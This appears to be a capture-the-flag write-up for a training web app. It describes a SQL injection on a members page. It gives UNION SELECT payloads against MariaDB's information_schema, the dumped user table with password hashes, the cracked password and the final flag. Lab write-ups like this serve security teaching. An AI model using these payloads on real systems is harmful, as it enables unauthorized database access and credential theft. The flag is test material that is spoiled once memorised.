# SQL Injection

The members page allows us to view a user based off of his id. This should set off alarm bells as this probably indicates a SQL request, especially when viewing the result.
Indeed, all SQL lines contain an id, and then additional information as defined by the admin.

```
ID: 1 
First name: one
Surname : me
```

## The Vuln

When testing with different inputs, we quickly learn that this is a MariaDB database. This is very useful info as this can help us craft or SQL payload. 
Before anything else, we need to see what tables are in the database as well as the columns in each table.

Thankfully we MariaDB has some useful tables that we can always access called "information_schema.tables" and "information_schema.columns"

As we only have two columns we can show at a time, let's first get all the table names, and then decide which ones to investigate further:

```
1 UNION SELECT TABLE_NAME, TABLE_ROWS FROM information_schema.tables
1 UNION SELECT table_name, column_name FROM information_schema.COLUMNS
```

Just taking a look at the tables, we see some interesting ones:
```
ID: 1 UNION SELECT TABLE_NAME, TABLE_ROWS FROM information_schema.tables 
First name: db_default
Surname : 2

ID: 1 UNION SELECT TABLE_NAME, TABLE_ROWS FROM information_schema.tables 
First name: users
Surname : 4

ID: 1 UNION SELECT TABLE_NAME, TABLE_ROWS FROM information_schema.tables 
First name: guestbook
Surname : 1

ID: 1 UNION SELECT TABLE_NAME, TABLE_ROWS FROM information_schema.tables 
First name: list_images
Surname : 5

ID: 1 UNION SELECT TABLE_NAME, TABLE_ROWS FROM information_schema.tables 
First name: vote_dbs
Surname : 5
```
---
Let's see what kind of things they are hiding:

|db_default|||
|:-:|:-:|:-:|
|id|username|password|

|users||||||||
|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
|user_id|first_name|last_name|town|country|planet|Commentaire|countersign|
|1|one|me|Paris|France|EARTH|Je pense, donc je suis|2b3366bcfd44f540e630d4dc2b9b06d9|
|2|two|me|Helsinki|Finlande|Earth|Aamu on iltaa viisaampi.|60e9032c586fb422e2c16dee6286cf10|
|3|three|me|Dublin|Irlande|Earth|Dublin is a city of stories and secrets.|e083b24a01c483437bcf4a9eea7c1b4d|
|5|Flag|GetThe|42|42|42|Decrypt this password -> then lower all the char. Sh256 on it and it's good !|5ff9d0165b4f92b14994e5c685cdce28|


|guestbook|||
|:-:|:-:|:-:|
|id_comment|comment|name|

|list_images||||
|:-:|:-:|:-:|:-:|
|id|url|title|comment|

|vote_dbs||||
|:-:|:-:|:-:|:-:|
|id_vote|vote|nb_vote|subject|

---
We can't seem to access the other tables beside users at the moment. Querys to the other tables results in
```
Table 'Member_Sql_Injection.'table_name'' doesn't exist
```

## Flag

Following the instructions in the commentaire section, we decrypt "5ff9d0165b4f92b14994e5c685cdce28", which is the MD5 hash of "FortyTwo".
making it lowercase and hashing it in sha256 results in the following:

```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```